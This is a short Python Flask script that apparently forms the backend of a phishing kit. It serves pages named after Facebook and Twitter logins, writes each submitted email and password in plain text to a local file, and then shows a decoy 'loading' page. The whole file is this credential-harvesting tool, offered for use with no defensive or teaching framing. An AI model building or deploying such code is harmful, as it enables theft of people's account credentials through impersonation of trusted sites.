#!/usr/bin/python3
#Coded by - WebDux (vakh0) -

from flask import Flask, render_template, request, json

app = Flask(__name__, template_folder='template')

@app.route('/')
def index():
	return render_template('index.html')
	
@app.route('/register/')
def register():
	return render_template('register.html')


@app.route('/auth/', methods=['POST'])
def loading():
    with open('file.json', 'a+') as f:
    	email = request.form['email']
    	password = request.form['pass']
    	f.write("\n\nEmail: ")
    	f.write(email)
    	f.write("\nPassword: ")
    	f.write(password)
    	f.close()

    return render_template('loading.html')

@app.route('/facebook/')
def facebook():
	return render_template('facebook.html')

@app.route('/twitter/')
def twitter():
	return render_template('twitter.html')

if __name__=='__main__':
	app.run(host="localhost", port=80, debug=True)
